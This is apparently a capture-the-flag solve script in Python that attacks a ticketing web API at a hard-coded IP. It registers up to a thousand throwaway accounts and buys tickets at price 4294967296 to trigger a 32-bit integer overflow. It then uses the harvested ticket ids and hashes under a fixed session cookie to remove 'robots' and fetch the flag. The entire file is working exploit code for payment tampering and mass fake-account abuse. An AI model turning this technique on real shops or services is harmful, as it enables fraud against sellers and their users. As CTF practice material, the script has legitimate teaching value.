#!/usr/bin/env python
# coding=utf-8

# @file solve.py
# @brief solve
# @author Anemone95,x565178035@126.com
# @version 1.0
# @date 2019-04-13 16:19

import requests
import time

def register(session, username):
    burp0_url = "http://117.51.147.155:5050/ctf/api/register?name={}&password=didididi".format(
        username)
    burp0_headers = {
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36",
        "Referer": "http://117.51.147.155:5050/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Connection": "close"}
    return session.get(burp0_url, headers=burp0_headers).json()["data"]


def buy(session):
    burp0_url = "http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"
    burp0_headers = {
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36",
        "Referer": "http://117.51.147.155:5050/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Connection": "close"}
    return session.get(
        burp0_url,
        headers=burp0_headers).json()["data"][0]["bill_id"]


def pay(session, _id):
    burp0_url = "http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id={}".format(
        _id)
    burp0_headers = {
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36",
        "Referer": "http://117.51.147.155:5050/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Connection": "close"}
    res=session.get(
        burp0_url,
        headers=burp0_headers).json()["data"][0]
    if "your_id" in res.keys():
        return res["your_id"],res["your_ticket"]
    else:
        return res["id"], res["hash_val"]

def remove(_id,ticket):
    burp0_url = "http://117.51.147.155:5050/ctf/api/remove_robot?id={0}&ticket={1}".format(_id, ticket)
    burp0_cookies = {"user_name": "anemone", "REVEL_SESSION": "20bd1cfd679c272ea95cc116511af4b0"}
    burp0_headers = {"Accept": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36", "Referer": "http://117.51.147.155:5050/index.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close"}
    return requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).json()["code"]==200

def get_flag():
    burp0_url = "http://117.51.147.155:5050/ctf/api/get_flag"
    burp0_cookies = {"user_name": "anemone",
                     "REVEL_SESSION": "20bd1cfd679c272ea95cc116511af4b0"}
    burp0_headers = {
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36",
        "Referer": "http://117.51.147.155:5050/index.html",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Connection": "close"}
    req=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    if req.status_code==200:
        return req.json()
    else:
        return None


def solve():
    for i in range(1000):
        print(i)
        session = requests.session()
        register(session, "anemone0{}".format(i))
        _id = buy(session)
        _id,ticket=pay(session,_id)
        if(remove(_id,ticket)):
            print(get_flag())
        time.sleep(1)


if __name__ == '__main__':
    solve()
